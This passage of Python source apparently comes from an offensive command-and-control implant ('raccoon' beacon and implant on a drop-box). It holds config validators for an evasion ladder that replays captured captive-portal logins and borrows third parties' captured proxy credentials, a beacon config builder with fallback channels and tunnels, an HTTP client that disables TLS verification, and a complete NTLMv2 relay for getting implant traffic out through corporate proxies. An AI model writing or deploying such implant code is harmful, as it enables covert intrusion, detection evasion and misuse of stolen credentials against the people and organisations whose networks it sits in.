        raise ValueError(
            "c2.way_out.state_dir is %r, which is under /tmp: both "
            "raccoon-beacon.service and raccoon-implant.service set "
            "PrivateTmp=true, so each process would get its own private /tmp "
            "and the beacon and the scout would never see each other's files"
            % (raw,))
    return path


def _way_out_whole(key: str, raw, floor: int) -> int:
    # `isinstance(True, int)` is True in Python, so a stray YAML boolean
    # would otherwise read as one.
    if isinstance(raw, bool) or not isinstance(raw, int):
        raise ValueError("c2.way_out.%s is %r, which is not a whole number"
                         % (key, raw))
    if raw < floor:
        raise ValueError(
            "c2.way_out.%s is %r, and anything below %d would leave this "
            "feature on with nothing it could ever do: say enabled: false if "
            "that is what is meant" % (key, raw, floor))
    return raw


def _way_out_threshold(raw, points_max):
    """The EV threshold, bounded below so it cannot open everything.

    Unbounded, a negative threshold made every rung reachable on the
    first cycle the decider may act -- the same hole `risk_coefficient: 1`
    opened, by the other end of the inequality. The bound is the curve's
    own ceiling: a threshold below `-points_max` cannot be crossed *back*
    by any evidence, so it is not a threshold.
    """
    if isinstance(raw, bool) or not isinstance(raw, (int, float)):
        raise ValueError("c2.way_out.ev_threshold is %r, which is not a "
                         "number" % (raw,))
    if raw < -points_max:
        raise ValueError(
            "c2.way_out.ev_threshold is %r, and anything below -%d is below "
            "what the curve can ever reach, so every rung including the "
            "irreversible one would be allowed on the first cycle the "
            "decider may act" % (raw, points_max))
    return raw


# Which way each modifier is allowed to point, and the sentence that says
# why. The range alone was not enough: `dot1x_detect: -0.4` is a legal
# fraction and it put the irreversible rung two hours *ahead* of the
# reversible one -- an inversion the operator's page promises in bold is
# impossible. The page's own wording invites the mistake, too, since it
# says the modifier "raises" a probability and an operator thinking in
# "less detectable" writes a negative.
_WAY_OUT_DIRECTIONS = {
    "dot1x_detect": (
        1, "raises the identity rung's detection probability, because a "
           "port that authenticates is a port somebody configured and "
           "therefore watches, so it is zero or more"),
    "portal_detect": (
        -1, "lowers the borrow rung's detection probability, because a "
            "network that redirects every browser sees credential prompts "
            "answered all day, so it is zero or less"),
}


def _way_out_fraction(key: str, raw) -> float:
    if isinstance(raw, bool) or not isinstance(raw, (int, float)):
        raise ValueError("c2.way_out.%s is %r, which is not a number"
                         % (key, raw))
    value = float(raw)
    if not -1.0 < value < 1.0:
        raise ValueError(
            "c2.way_out.%s is %r, and it moves a probability, so it is a "
            "fraction strictly between -1 and 1" % (key, raw))
    sign, reason = _WAY_OUT_DIRECTIONS[key]
    if value * sign < 0:
        raise ValueError(
            "c2.way_out.%s is %r, and it %s. A modifier pointing the other "
            "way inverts the ladder, which is the one thing a policy may "
            "not do" % (key, raw, reason))
    return value


def _way_out_model(raw) -> dict:
    """The scout's model client. Read here so a typo is refused once."""
    if raw is None:
        return dict(_WAY_OUT_MODEL_DEFAULTS)
    if not isinstance(raw, dict):
        raise ValueError(
            "c2.way_out.model is %r, which is not a mapping of %s"
            % (raw, ", ".join(_WAY_OUT_MODEL_KEYS)))
    unknown = [key for key in raw if key not in _WAY_OUT_MODEL_KEYS]
    if unknown:
        raise ValueError(
            "c2.way_out.model has %s, which is not a setting it has: it "
            "takes %s" % (", ".join(repr(key) for key in unknown),
                          ", ".join(_WAY_OUT_MODEL_KEYS)))
    model = dict(_WAY_OUT_MODEL_DEFAULTS)
    enabled = raw.get("enabled", False)
    if not isinstance(enabled, bool):
        raise ValueError(
            "c2.way_out.model.enabled is %r, and only the boolean true "
            "enables it. It ships off, and not out of timidity: without a "
            "device nobody can say what inference costs on PoE, so the first "
            "operator to switch it on is the first measurement" % (enabled,))
    model["enabled"] = enabled
    endpoint = raw.get("endpoint", model["endpoint"])
    if not isinstance(endpoint, str) or not _way_out_is_loopback(endpoint):
        raise ValueError(
            "c2.way_out.model.endpoint is %r, and the model exists for this "
            "implant's own decision: it is reached on loopback only. A "
            "listener an implant can reach across the network is one anybody "
            "on the network the implant is hiding in can reach" % (endpoint,))
    model["endpoint"] = endpoint
    name = raw.get("name", model["name"])
    if not isinstance(name, str):
        raise ValueError("c2.way_out.model.name is %r, which is not a model "
                         "name" % (name,))
    model["name"] = name
    model["timeout_seconds"] = _way_out_whole(
        "model.timeout_seconds", raw.get("timeout_seconds",
                                         model["timeout_seconds"]), 1)
    if model["enabled"] and not model["name"]:
        raise ValueError(
            "c2.way_out.model is enabled and names no model, so the scout "
            "would have nothing to ask: name the model it should pull")
    return model


def _way_out_is_loopback(endpoint: str) -> bool:
    """Whether a URL's host is this host, by text and not by resolution.

    By text on purpose: a name that resolves to 127.0.0.1 today is a name
    somebody else's DNS can move tomorrow, and this check is about where
    the implant's inference is allowed to be -- a question the file has to
    settle, not the network.
    """
    text = (endpoint or "").strip().lower()
    for scheme in ("http://", "https://"):
        if text.startswith(scheme):
            host = text[len(scheme):].split("/", 1)[0]
            host = host.rsplit("@", 1)[-1]
            if host.startswith("["):
                host = host[1:].split("]", 1)[0]
            else:
                host = host.split(":", 1)[0]
            return host in ("127.0.0.1", "localhost", "::1")
    return False


def tunnel_config_from_yaml(c2_cfg: dict, env=None) -> Optional[dict]:
    """Build the endpoint's `tunnel` block from `c2.tunnel`, or None.

    The sibling of `beacon_config_from_fallback` for the other thing a
    drop-box can run, and the reason goal 3 of this work is reachable: on
    a host where systemd starts the endpoint there is no beacon above it
    and no generated config block, so the file has to be able to say the
    same eight things the generator bakes in.

    `c2.tunnel` is **this host as a tunnel client** -- the endpoint dials
    out. `c2.tunnel_server` is the other side, the socket endpoints dial
    in to, and nothing here reads it. The two look alike and mean opposite
    things, exactly as `c2.fallback` and `c2.listeners` do; see
    `listeners/registry.py`.

    No `c2.tunnel` block at all yields None and is not an error: every
    deployment that predates this feature has none, and all of them have
    to keep starting.

    **The PSK is not read from the file.** Under `Noise_NKpsk0` the
    endpoint presents no static key of its own, so the PSK plus the
    server's public key is the entire credential, and this repository
    already settled where such a thing lives when it kept
    `RACCOON_LISTENER_TOKEN` out of the same file: a shared secret does
    not belong in something somebody will paste into a ticket. It comes
    from `RACCOON_TUNNEL_PSK`, which
    `services/raccoon-tunnel.service` supplies through an
    `EnvironmentFile`. A `psk` key found in the file is **refused by
    name**, whether the tunnel is enabled or not: ignoring it silently
    would leave the secret sitting in git with nobody told, and a
    refusal that waited for somebody to switch the tunnel on would have
    chosen the worst possible moment to appear.

    `env` is a seam for the tests. The deployed path is `os.environ`.

    Every problem is a `ValueError` naming the field, including the ones
    `tunnel_config_problem` finds: this is where the config is loaded, so
    this is where that predicate is asked. The caller decides what a
    refusal costs -- `tunnel_standalone` exits, and
    `beacon_config_from_fallback` leaves the block out and logs, because
    the beacon is the access and the tunnel is the convenience.
    """
    tunnel = c2_cfg.get("tunnel") if isinstance(c2_cfg, dict) else None
    if tunnel is None:
        return None
    if not isinstance(tunnel, dict):
        raise ValueError("c2.tunnel is %s, not a mapping"
                         % type(tunnel).__name__)
    if "psk" in tunnel:
        raise ValueError(
            "c2.tunnel.psk is not read from this file: it is the whole "
            "credential, and a shared secret does not belong in something "
            "somebody will paste into a ticket. Delete the key and put the "
            "value in %s instead, the way "
            "services/raccoon-tunnel.service does with an EnvironmentFile."
            % _TUNNEL_PSK_ENV)

    enabled = bool(tunnel.get("enabled"))
    psk = ""
    if enabled:
        source = os.environ if env is None else env
        supplied = source.get(_TUNNEL_PSK_ENV, "")
        problem = None
        try:
            _tunnel_key(supplied, _TUNNEL_PSK_ENV,
                        "this host's pre-shared key")
        except ValueError as exc:
            problem = str(exc)
        if problem:
            # Raised outside the except block, as `_tunnel_key` raises its
            # own: nothing that touched the value may ride along in the
            # exception chain.
            raise ValueError(
                "%s, and c2.tunnel is enabled. It is deliberately not in "
                "the config file; see services/raccoon-tunnel.service"
                % problem)
        psk = supplied.strip()

    # Every field, always, so this and the generator produce one shape.
    # `server`, `port`, `public_key` and `identity` are passed through
    # untouched rather than defaulted, so that a block which cannot work
    # is named by `tunnel_config_problem` below and not quietly completed
    # here into something that dials the wrong place.
    block = {
        "enabled": enabled,
        "server": tunnel.get("server", ""),
        "port": tunnel.get("port"),
        "public_key": tunnel.get("public_key", ""),
        "psk": psk,
        "identity": tunnel.get("identity", ""),
        "keepalive_seconds": tunnel.get("keepalive_seconds",
                                        _DEFAULT_KEEPALIVE),
        "allow_slow_crypto": bool(tunnel.get("allow_slow_crypto")),
    }
    problem = tunnel_config_problem({"c2": {"tunnel": block}})
    if problem:
        raise ValueError(problem)
    return block


def beacon_config_from_fallback(c2_cfg: dict, dropbox: bool = True,
                                env=None) -> dict:
    """Build a Beacon config from a `c2` block of `configs/raccoon.yaml`.

    Reads `c2.fallback.*`, which is the **beacon** side of the file: the
    channels an implant on this host will try. `c2.listeners` is the
    server side and is read by `listeners.registry` instead.

    A transport absent from the file becomes an empty mapping, which the
    beacon reads as disabled. That is why this cannot simply pass the
    fallback block through: the beacon expects its transports at the top
    of its own `c2` block, not nested under `fallback`.

    `c2.tunnel` comes through `tunnel_config_from_yaml` and lands at
    `c2.tunnel` of the config this returns, which is where both `Beacon`
    and `TunnelEndpoint` look for it.

    `c2.egress_decider` comes through `read_egress_policy` and lands at
    `c2.egress_decider` beside it. Neither is a transport, so neither is
    in the loop over `_FALLBACK_TRANSPORTS`. The decider block is **always**
    present in what this returns, unlike the tunnel's: the reader cannot
    fail, so a key that was sometimes absent would only make every later
    reader write `.get("egress_decider") or {}` and get the default wrong
    once. It is read from `c2` and not from `c2.fallback`, because the
    fallback block is the five legs and a policy is not a leg -- and a
    policy found *inside* `c2.fallback` is left unread and said out loud,
    because it is the one unusable policy `read_egress_policy` never sees
    and would otherwise be the only misconfiguration here with no line to
    its name.

    **A tunnel this host cannot run does not cost it its beacon, and does
    not lose its reason either.** That loader refuses a block it cannot
    make, naming the field. Here the block is left out -- it is the only
    one there is, and in the `psk`-in-the-file case it is the one holding
    the file's secret, so handing it on would let `tunnel start` dial
    with the value this rule exists to refuse. What is kept is the
    reason, at `c2.tunnel_problem`, which `Beacon._tunnel_start` answers
    the operator with. Without it `tunnel_mode_problem` would take its
    no-block arm and say "generate the build with the tunnel enabled",
    which is false and unactionable advice for a host whose tunnel came
    from a file.

    The beacon starts either way, because it is the access and the tunnel
    is the convenience. The log line is a second channel and not the only
    one: this function is reached only when Sliver is unavailable and
    `c2.fallback.enabled` is true, and it writes to a rotating file, so a
    refusal that lived only there would be a refusal nobody saw.
    """
    fallback = c2_cfg.get("fallback") or {}
    if not isinstance(fallback, dict):
        # `fallback: true` instead of a block, which reads like a switch
        # and is the shape the block's own `enabled` key invites. The
        # loop below used to reach `.get` on it and raise AttributeError
        # before anything validated it -- and this function is the one
        # place a `c2` block becomes a beacon config, so raising here
        # costs the access on a host nobody can reach. The five
        # transports' own posture therefore applies to the block that
        # holds them: unusable reads as absent, said once, with the
        # value in it.
        logger.warning(
            "c2.fallback is %r, which is not a mapping of the five "
            "transports, so none of them was read and the beacon has no "
            "leg configured from this file. The transports belong under "
            "it as a block, as configs/raccoon.yaml ships them.",
            fallback)
        fallback = {}
    block = {
        "beacon_interval_seconds": c2_cfg.get("beacon_interval_seconds", 300),
        "jitter_percent": c2_cfg.get("jitter_percent", 20),
        "encryption_key": c2_cfg.get("encryption_key", ""),
        "proxy": c2_cfg.get("proxy", {}),
        "dropbox": dropbox,
    }
    for transport in _FALLBACK_TRANSPORTS:
        block[transport] = fallback.get(transport, {})
    # A policy nested one level too deep is the one misconfiguration this
    # reader cannot see: `read_egress_policy` is never handed it, so the
    # decider is off while the file shows a complete, plausible block. It
    # is a likely mistake, too -- the decider is *about* fallback
    # behaviour and `c2.fallback` sits immediately beside it -- and the
    # same error one key wide, `budgte: 3`, is refused by name a few
    # functions above. So this one says so as well. **What is read does
    # not change**: a block in the wrong place stays unread, because
    # taking it from either place would make the file's own structure
    # meaningless. It only stops being silent.
    #
    # `isinstance` and not a bare `in`, because `c2_cfg.get("fallback") or
    # {}` leaves a scalar a scalar and `in` on a string is a substring
    # test -- which would answer "yes" to `fallback: egress_decider` and
    # log about a block nobody wrote. The loop above happens to fail
    # first on such a value today; the guard is what keeps this line
    # right if it ever stops doing so.
    #
    # The second half of the line is the state that actually results,
    # because a warning claiming "the decider is off" on a host with a
    # perfectly good `c2.egress_decider` beside the stray one would be a
    # false statement on the one channel the operator has.
    if isinstance(fallback, dict) and "egress_decider" in fallback:
        logger.warning(
            "c2.fallback.egress_decider is not read: the policy belongs at "
            "c2.egress_decider, beside c2.fallback and not inside it. %s",
            "The block at c2.egress_decider is the one that was read"
            if "egress_decider" in c2_cfg else "The decider is off")
    # Not a transport, so not in the loop above. A policy that cannot be
    # used reads as off with its reason logged, and never raises: the
    # beacon is the access, and a refusal that stopped it would have cost
    # that access in order to protect a policy.
    block["egress_decider"] = read_egress_policy(c2_cfg.get("egress_decider"))
    # The same argument as the decider's, for the same reason: the reader
    # cannot fail, so a key that was sometimes absent would only make every
    # later reader write `.get("way_out") or {}` and get the default wrong
    # once.
    block["way_out"] = read_way_out_policy(c2_cfg.get("way_out"))
    try:
        tunnel = tunnel_config_from_yaml(c2_cfg, env=env)
    except ValueError as exc:
        logger.error("c2.tunnel cannot be used and has been left out of "
                     "this config: %s", exc)
        block["tunnel_problem"] = str(exc)
        tunnel = None
    if tunnel is not None:
        block["tunnel"] = tunnel
    return {"c2": block}


# ── Stdlib HTTP client ──

class _HttpSession:
    """Minimal HTTP session using urllib — replaces requests.Session."""

    def __init__(self):
        self.proxies: dict = {}
        self.trust_env: bool = True
        # Headers every request through this session carries. One user so
        # far: the borrow rung's `Proxy-Authorization`, which is here
        # rather than in the proxy URL's userinfo because a URL is what
        # `_system_info` reports to the team server and what `proxyinfo`
        # prints -- so a password in it would be persisted in the server's
        # database and rendered in its panel. A third party's credential,
        # captured from their traffic, must not leave the device.
        self.headers: dict = {}
        # The local address every connection from this session leaves by,
        # or None for the kernel's choice. One user: the way out's radio
        # rung, whose route is selected by an `ip rule from <address>` --
        # a rule that matches only packets whose source *is* that address.
        # Without binding it the rung installed a route nothing could ever
        # select and said it had changed how the implant gets out.
        self.source_address = None
        self._cookie_jar = urllib.request.HTTPCookieProcessor()

    def _build_opener(self):
        handlers = [self._cookie_jar]
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE
        keylog = os.environ.get("SSLKEYLOGFILE")
        if keylog and hasattr(ssl_ctx, "keylog_filename"):
            ssl_ctx.keylog_filename = keylog
        if self.source_address:
            # urllib's own handlers pass no `source_address` to
            # `http.client`, so the two below are subclasses that do. See
            # `source_address` above for why this exists at all.
            handlers.append(_SourceBoundHttpsHandler(ssl_ctx,
                                                     self.source_address))
            handlers.append(_SourceBoundHttpHandler(self.source_address))
        else:
            handlers.append(urllib.request.HTTPSHandler(context=ssl_ctx))

        if self.proxies:
            handlers.append(urllib.request.ProxyHandler(self.proxies))
        elif not self.trust_env:
            handlers.append(urllib.request.ProxyHandler({}))

        return urllib.request.build_opener(*handlers)

    def post(self, url: str, json_data: dict, headers: dict,
             timeout: float = 30) -> "_HttpResponse":
        body = json.dumps(json_data, separators=(",", ":")).encode()
        req = urllib.request.Request(url, data=body, method="POST")
        for k, v in dict(self.headers, **headers).items():
            req.add_header(k, v)
        if "Content-Type" not in headers:
            req.add_header("Content-Type", "application/json")

        opener = self._build_opener()
        try:
            resp = opener.open(req, timeout=timeout)
            return _HttpResponse(resp.getcode(), resp.read())
        except urllib.error.HTTPError as e:
            return _HttpResponse(e.code, e.read() if hasattr(e, "read") else b"")
        except urllib.error.URLError as e:
            if "proxy" in str(e.reason).lower() or "tunnel" in str(e.reason).lower():
                raise _ProxyError(str(e.reason)) from e
            raise

    def post_raw(self, url: str, body: bytes, headers: dict,
                 timeout: float = 30) -> "_HttpResponse":
        """POST bytes as they are, with the content type the caller names.

        `post` above serialises JSON, which is what every leg of this
        beacon sends. The captive-portal rung sends a form body it did not
        compose -- it replays exactly what the scout saw the host send --
        so it needs the bytes passed through unchanged.

        An HTTP error status is an answer and not an exception here, as it
        is in `post`: a portal that refuses is the thing the rung has to
        report.
        """
        req = urllib.request.Request(url, data=body, method="POST")
        for key, value in dict(self.headers, **headers).items():
            req.add_header(key, value)
        opener = self._build_opener()
        try:
            resp = opener.open(req, timeout=timeout)
            return _HttpResponse(resp.getcode(), resp.read())
        except urllib.error.HTTPError as e:
            return _HttpResponse(e.code,
                                 e.read() if hasattr(e, "read") else b"")

    def head(self, url: str, timeout: float = 10) -> "_HttpResponse":
        req = urllib.request.Request(url, method="HEAD")
        opener = self._build_opener()
        try:
            resp = opener.open(req, timeout=timeout)
            return _HttpResponse(resp.getcode(), b"")
        except urllib.error.HTTPError as e:
            return _HttpResponse(e.code, b"")


class _SourceBoundHttpHandler(urllib.request.HTTPHandler):
    """`urllib`'s HTTP handler, with every connection bound to one address.

    `HTTPHandler.http_open` hands `http.client.HTTPConnection` to
    `do_open` and forwards no extra keyword, so there is no way to ask
    `urllib` for a source address. A subclass with a connection factory is
    the whole of it.
    """

    def __init__(self, source_address):
        urllib.request.HTTPHandler.__init__(self)
        self._source_address = source_address

    def http_open(self, req):
        def connection(*args, **kwargs):
            kwargs["source_address"] = self._source_address
            return http_client.HTTPConnection(*args, **kwargs)
        return self.do_open(connection, req)


class _SourceBoundHttpsHandler(urllib.request.HTTPSHandler):
    """The same for HTTPS, carrying the session's SSL context with it."""

    def __init__(self, context, source_address):
        urllib.request.HTTPSHandler.__init__(self, context=context)
        self._source_address = source_address

    def https_open(self, req):
        def connection(*args, **kwargs):
            kwargs["source_address"] = self._source_address
            return http_client.HTTPSConnection(*args, **kwargs)
        return self.do_open(connection, req, context=self._context)


class _HttpResponse:
    def __init__(self, status_code: int, body: bytes):
        self.status_code = status_code
        self._body = body

    def json(self) -> dict:
        return json.loads(self._body)


class _ProxyError(Exception):
    pass


# ── NTLM Proxy Relay ──

class _NtlmProxyRelay:
    """Local CONNECT proxy that handles NTLMv2 auth to an upstream corporate proxy.

    Listens on 127.0.0.1:<random-port>, accepts CONNECT requests from urllib,
    performs the NTLM 3-step handshake on a single TCP connection to the upstream
    proxy, then bridges the raw TCP tunnel bidirectionally.

    This solves the problem where WinINet/urllib cannot do NTLM proxy auth with
    cross-domain credentials (user is not in the proxy's AD domain).
    """

    # Header read guards — a hostile/broken proxy must not be able to make us
    # allocate unbounded memory while parsing the CONNECT response.
    _MAX_LINE = 8192
    _MAX_HEADERS = 100
    # Idle timeout for the handshake only. Cleared before bridging so that a
    # long-lived tunnel is never torn down mid-transfer.
    _HANDSHAKE_TIMEOUT = 30

    def __init__(self, upstream_host: str, upstream_port: int,
                 username: str, password: str, domain: str = "",
                 workstation: str = ""):
        self._upstream = (upstream_host, upstream_port)
        self._user, self._domain = self._split_identity(username, domain)
        self._password = password
        self._workstation = (workstation or platform.node() or "WORKSTATION")
        self._listen_port = 0
        self._server: Optional[socket.socket] = None
        self._thread: Optional[threading.Thread] = None
        self._running = False

    @staticmethod
    def _split_identity(username: str, domain: str) -> tuple:
        """Accept 'DOMAIN\\user', 'user@domain' or a separate domain argument."""
        user = username or ""
        if not domain:
            if "\\" in user:
                domain, user = user.split("\\", 1)
            elif "/" in user:
                domain, user = user.split("/", 1)
            elif "@" in user:
                user, domain = user.split("@", 1)
        return user, domain or ""

    @property
    def port(self) -> int:
        return self._listen_port

    @property
    def url(self) -> str:
        return f"http://127.0.0.1:{self._listen_port}"

    @property
    def upstream_url(self) -> str:
        return f"http://{self._upstream[0]}:{self._upstream[1]}"

    @property
    def identity(self) -> str:
        return f"{self._domain}\\{self._user}" if self._domain else self._user

    def start(self) -> int:
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server.bind(("127.0.0.1", 0))
        self._listen_port = self._server.getsockname()[1]
        self._server.listen(20)
        self._running = True
        self._thread = threading.Thread(
            target=self._accept_loop, daemon=True, name="ntlm-proxy-relay")
        self._thread.start()
        logger.info("NTLM proxy relay on 127.0.0.1:%d -> %s:%d (identity: %s, workstation: %s)",
                    self._listen_port, self._upstream[0], self._upstream[1],
                    self.identity, self._workstation)
        return self._listen_port

    def stop(self):
        self._running = False
        if self._server:
            # close() alone does not wake an accept() blocked in another
            # thread: closing a descriptor someone is blocked on is undefined
            # in POSIX. macOS wakes it anyway (and there shutdown() raises
            # ENOTCONN on a listener, so close() does the waking); Linux
            # leaves the socket bound and still accepting until accept()
            # returns, so a stopped relay would keep an open port on the
            # target. shutdown() is what wakes it there. It can raise --
            # teardown must not, and close() below still runs.
            try:
                self._server.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            try:
                self._server.close()
            except Exception:
                pass
            self._server = None
        if self._thread:
            self._thread.join(timeout=2)
            self._thread = None

    def _accept_loop(self):
        while self._running:
            try:
                client, _ = self._server.accept()
            except OSError:
                # Listening socket closed by stop() — normal shutdown.
                break
            except Exception as e:
                logger.debug("NTLM relay accept error: %s", e)
                continue
            try:
                threading.Thread(
                    target=self._handle_client, args=(client,), daemon=True).start()
            except Exception as e:
                logger.debug("NTLM relay spawn error: %s", e)
                try:
                    client.close()
                except Exception:
                    pass

    def _handle_client(self, client: socket.socket):
        upstream = None
        try:
            client.settimeout(self._HANDSHAKE_TIMEOUT)
            request_line = self._read_line(client)
            self._drain_headers(client)

            if not request_line or not request_line.startswith("CONNECT"):
                self._send_error(client, "405 Method Not Allowed")
                return

            parts = request_line.split(" ")
            if len(parts) < 2:
                self._send_error(client, "400 Bad Request")
                return
            target = parts[1]

            upstream = self._connect_upstream()

            # Step 1: CONNECT without auth. Either the proxy lets us straight
            # through, or it answers 407 and offers NTLM.
            self._send_connect(upstream, target, None)
            status, challenge, closed = self._read_response(upstream)

            if status and " 200" in status:
                logger.debug("NTLM relay: upstream needs no auth for %s", target)
                self._establish(client, upstream)
                return

            # Type 1 and Type 3 must travel over the same TCP connection. If the
            # proxy closed it after the 407, open a fresh one.
            if closed:
                upstream.close()
                upstream = self._connect_upstream()

            # Step 2: CONNECT with Type 1 → expect 407 + Type 2 challenge.
            type1 = self._make_type1()
            self._send_connect(upstream, target,
                               "NTLM " + base64.b64encode(type1).decode())
            _, type2_b64, closed = self._read_response(upstream)

            if not type2_b64:
                logger.debug("NTLM relay: no Type 2 challenge from upstream proxy")
                self._send_error(client, "502 Bad Gateway")
                return
            if closed:
                logger.debug("NTLM relay: upstream closed connection mid-handshake")
                self._send_error(client, "502 Bad Gateway")
                return

            # Step 3: CONNECT with Type 3 → expect 200.
            try:
                type2 = base64.b64decode(type2_b64)
            except Exception:
                logger.debug("NTLM relay: malformed Type 2 challenge")
                self._send_error(client, "502 Bad Gateway")
                return

            type3 = self._make_type3(type2)
            self._send_connect(upstream, target,
                               "NTLM " + base64.b64encode(type3).decode())
            status, _, _ = self._read_response(upstream)

            if status and " 200" in status:
                self._establish(client, upstream)
            else:
                logger.debug("NTLM relay: auth rejected by upstream (%s)", status)
                self._send_error(client, "407 Proxy Authentication Required")
        except Exception as e:
            logger.debug("NTLM relay client error: %s", e)
        finally:
            try:
                client.close()
            except Exception:
                pass
            if upstream:
                try:
                    upstream.close()
                except Exception:
                    pass

    def _connect_upstream(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self._HANDSHAKE_TIMEOUT)
        sock.connect(self._upstream)
        return sock

    def _establish(self, client: socket.socket, upstream: socket.socket):
        """Confirm the tunnel to the local client and start bridging."""
        client.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
        # Blocking mode for the tunnel: the handshake timeout must not kill a
        # long-lived or slow transfer.
        client.settimeout(None)
        upstream.settimeout(None)
        self._bridge(client, upstream)

    def _drain_headers(self, sock: socket.socket):
        for _ in range(self._MAX_HEADERS):
            if not self._read_line(sock):
                return

    def _send_connect(self, sock: socket.socket, target: str,
                      auth: Optional[str]):
        msg = f"CONNECT {target} HTTP/1.1\r\nHost: {target}\r\n"
        if auth:
            msg += f"Proxy-Authorization: {auth}\r\n"
        msg += "Proxy-Connection: Keep-Alive\r\n\r\n"
        sock.sendall(msg.encode())

    def _read_response(self, sock: socket.socket) -> tuple:
        """Read a proxy response. Returns (status_line, ntlm_challenge, closed)."""
        ntlm_challenge = None
        status_line = self._read_line(sock)
        body_len = 0
        closed = False
        for _ in range(self._MAX_HEADERS):
            line = self._read_line(sock)
            if not line:
                break
            lower = line.lower()
            if lower.startswith("proxy-authenticate:") and "ntlm" in lower:
                value = line.split(":", 1)[1].strip()
                # "NTLM" alone is just the offer; "NTLM <base64>" is the challenge.
                if len(value) > 5:
                    ntlm_challenge = value[5:].strip() or None
            elif lower.startswith("content-length:"):
                try:
                    body_len = int(line.split(":", 1)[1].strip())
                except ValueError:
                    pass
            elif lower.startswith(("connection:", "proxy-connection:")):
                if "close" in lower:
                    closed = True
        # Swallow any error body so the socket stays usable for the next step.
        remaining = body_len
        while remaining > 0:
            chunk = sock.recv(min(remaining, 4096))
            if not chunk:
                closed = True
                break
            remaining -= len(chunk)
        return status_line, ntlm_challenge, closed

    def _bridge(self, s1: socket.socket, s2: socket.socket):
        def forward(src, dst):
            try:
                while True:
                    data = src.recv(8192)
                    if not data:
                        break
                    dst.sendall(data)
            except Exception:
                pass
            # Half-close the peer so it sees EOF and can finish its own direction.
            try:
                dst.shutdown(socket.SHUT_WR)
            except Exception:
                pass

        t1 = threading.Thread(target=forward, args=(s1, s2), daemon=True)
        t2 = threading.Thread(target=forward, args=(s2, s1), daemon=True)
        t1.start()
        t2.start()
        # Wait for BOTH directions. Joining only one would let the caller's
        # finally-block close the sockets and truncate the in-flight response.
        t1.join()
        t2.join()

    def _read_line(self, sock: socket.socket) -> Optional[str]:
        buf = []
        while len(buf) < self._MAX_LINE:
            b = sock.recv(1)
            if not b:
                return None if not buf else "".join(buf)
            c = b[0]
            if c == 10:  # LF
                break
            if c != 13:  # skip CR
                buf.append(chr(c))
        return "".join(buf)

    def _send_error(self, sock: socket.socket, status: str):
        try:
            sock.sendall(
                f"HTTP/1.1 {status}\r\nContent-Length: 0\r\n"
                f"Connection: close\r\n\r\n".encode())
        except Exception:
            pass

    # ── NTLMv2 message construction (stdlib only, no dependencies) ──

    # NEGOTIATE_UNICODE | NEGOTIATE_OEM | REQUEST_TARGET | NEGOTIATE_NTLM
    # | NEGOTIATE_ALWAYS_SIGN | NEGOTIATE_EXTENDED_SESSIONSECURITY
    _NEGOTIATE_FLAGS_TYPE1 = 0x00088207
    # Same minus OEM/REQUEST_TARGET — unicode only for the authenticate message.
    _NEGOTIATE_FLAGS_TYPE3 = 0x00088201

    def _make_type1(self) -> bytes:
        msg = bytearray(32)
        msg[0:7] = b"NTLMSSP"
        msg[8] = 1  # Type 1
        struct.pack_into("<I", msg, 12, self._NEGOTIATE_FLAGS_TYPE1)
        return bytes(msg)

    def _make_type3(self, type2: bytes) -> bytes:
        if len(type2) < 32 or not type2.startswith(b"NTLMSSP\x00"):
            raise ValueError("invalid NTLM Type 2 message")

        challenge = type2[24:32]
        target_info = b""
        if len(type2) >= 48:
            ti_len = struct.unpack_from("<H", type2, 40)[0]
            ti_off = struct.unpack_from("<I", type2, 44)[0]
            if ti_off + ti_len <= len(type2):
                target_info = type2[ti_off:ti_off + ti_len]

        # NTLMv2: the identity blob is upper(user) + domain, domain NOT uppercased.
        nt_hash = self._md4(self._password.encode("utf-16-le"))
        identity = (self._user.upper() + self._domain).encode("utf-16-le")
        ntv2_hash = self._hmac_md5(nt_hash, identity)

        client_challenge = os.urandom(8)
        timestamp = struct.pack("<Q", int((time.time() + 11644473600) * 10000000))

        blob = io.BytesIO()
        blob.write(b"\x01\x01\x00\x00")  # RespType 1, HiRespType 1, Z(2)
        blob.write(b"\x00" * 4)           # Z(4)
        blob.write(timestamp)
        blob.write(client_challenge)
        blob.write(b"\x00" * 4)           # Z(4)
        blob.write(target_info)
        blob.write(b"\x00" * 4)           # Z(4)
        blob_bytes = blob.getvalue()

        nt_proof = self._hmac_md5(ntv2_hash, challenge + blob_bytes)
        nt_response = nt_proof + blob_bytes

        domain_bytes = self._domain.encode("utf-16-le")
        user_bytes = self._user.encode("utf-16-le")
        ws_bytes = self._workstation.upper().encode("utf-16-le")
        # EncryptedRandomSessionKey stays empty: we never set NEGOTIATE_KEY_EXCH,
        # and a populated field without that flag makes some proxies reject us.
        session_key = b""

        # Payload starts after the 64-byte header + 8-byte Version + 16-byte MIC.
        payload_off = 88
        domain_off = payload_off
        user_off = domain_off + len(domain_bytes)
        ws_off = user_off + len(user_bytes)
        lm_off = ws_off + len(ws_bytes)
        nt_off = lm_off  # LM response is empty, so it shares the offset
        sk_off = nt_off + len(nt_response)

        msg = bytearray(sk_off + len(session_key))
        msg[0:7] = b"NTLMSSP"
        msg[8] = 3  # Type 3
        struct.pack_into("<I", msg, 60, self._NEGOTIATE_FLAGS_TYPE3)
        struct.pack_into("<HHI", msg, 12, 0, 0, lm_off)  # LM response (empty)
        struct.pack_into("<HHI", msg, 20, len(nt_response), len(nt_response), nt_off)
        struct.pack_into("<HHI", msg, 28, len(domain_bytes), len(domain_bytes), domain_off)
        struct.pack_into("<HHI", msg, 36, len(user_bytes), len(user_bytes), user_off)
        struct.pack_into("<HHI", msg, 44, len(ws_bytes), len(ws_bytes), ws_off)
        struct.pack_into("<HHI", msg, 52, len(session_key), len(session_key), sk_off)

        msg[domain_off:domain_off + len(domain_bytes)] = domain_bytes
        msg[user_off:user_off + len(user_bytes)] = user_bytes
        msg[ws_off:ws_off + len(ws_bytes)] = ws_bytes
        msg[nt_off:nt_off + len(nt_response)] = nt_response
        return bytes(msg)

    @staticmethod
    def _hmac_md5(key: bytes, data: bytes) -> bytes:
        import hmac as _hmac
        return _hmac.new(key, data, hashlib.md5).digest()
